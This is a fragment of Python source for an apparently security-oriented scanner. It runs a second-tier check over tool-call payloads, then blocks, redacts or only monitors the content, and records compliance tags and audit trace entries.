    org_override = _org_tier2_allowed(enabled_info)
    if org_override is False:
        result.scan_trace.append(
            {"scan_stage": "tier2_skipped", "tier": "tier2", "reason": "org_mcp_tier2_disabled"}
        )
        return _finalize_output(mutable if result_redacted else payload), result

    strict_mode = tier2_ctrl.get("strict_mode") or "strict"
    # Pure Tier-2 on/off (operator model): under the flag Tier-2 has NO operator action gate — the
    # verdict is authoritative (handled in _scan_text_tier2). ``tier2_action`` here resolves
    # observe-only ("monitor") and is used only for the audit trace + the monitored/flag-for-review
    # accounting below; it never gates the block/mask decision under policy_only. Legacy (flag off)
    # keeps the posture-derived action.
    tier2_action = _resolve_tier_action(tier2_ctrl, "monitor" if _policy_only else enforcement)
    org_strict = bool((enabled_info or {}).get("tier2_strict", True))

    for text, setter, path_label in targets:
        if not text:
            continue
        new_text, t2_findings, t2_blocked, fallback = await _scan_text_tier2(
            text,
            scan_direction=scan_direction,
            enforcement=tier2_action,
            scanner=scanner,
            org_slug=org_slug,
            org_tier2_override=org_override,
            org_tier2_strict=org_strict,
            strict_mode=strict_mode,
            policy_only=_policy_only,
        )
        result.findings.extend(t2_findings)
        if t2_findings:
            for f in t2_findings:
                result.compliance_tags = _merge_tags(
                    result.compliance_tags, _tags_for_finding(f)
                )
            if _is_observe_only_posture(tier2_action) and not result.blocked and not result_redacted:
                result.monitored = True
        result.scan_trace.append(
            {
                "scan_stage": "tier2",
                "tier": "tier2",
                "direction": scan_direction,
                "target_mode": target_mode,
                "key_path": path_label,
                "strict_mode": strict_mode,
                "action": tier2_action,
                "effective_control_id": tier2_ctrl.get("control_id"),
                "fallback_reason": fallback,
                "finding_count": len(t2_findings),
            }
        )
        if t2_blocked:
            result.blocked = True
            result.monitored = False  # F3: a blocked call is never observe-only
            return payload, result
        if (fallback and strict_mode == "strict" and "strict" in fallback
                and not _is_observe_only_posture(tier2_action)):
            # Operator-control #2: the strict fail-closed re-block never fires under an observe-only
            # Tier-2 action (monitor/tag) — matching _scan_text_tier2, which now returns a fail-OPEN
            # fallback in that case, so "strict" never appears in it. Guarded here for defence in depth.
            result.blocked = True
            result.monitored = False
            return payload, result
        if new_text != text and (tier2_action == "redact" or _policy_only):
            # Under the policy-only flag _scan_text_tier2 only returns a changed text when the Tier-2
            # VERDICT was 'redact' AND the operator granted an enforcing action, so applying the mask
            # whenever it changed honors the verdict without dropping it (a 'redact' verdict under a
            # 'block' Tier-2 action masks — never escalates, never leaks raw).
            setter(new_text)
            result_redacted = True

    # F3 audit honesty: 'monitored' means NOTHING was enforced on this call. Recompute from the
    # FINAL state so a later-lane enforcement (e.g. a Tier-2 redact after a Tier-1 observe) clears an
    # earlier per-lane observe set — the incremental sets alone left monitored=True on an enforced call.
    result.monitored = bool(result.findings) and not result.blocked and not result_redacted
    out = _finalize_output(state_ref[0] if result_redacted else payload)
    return out, result
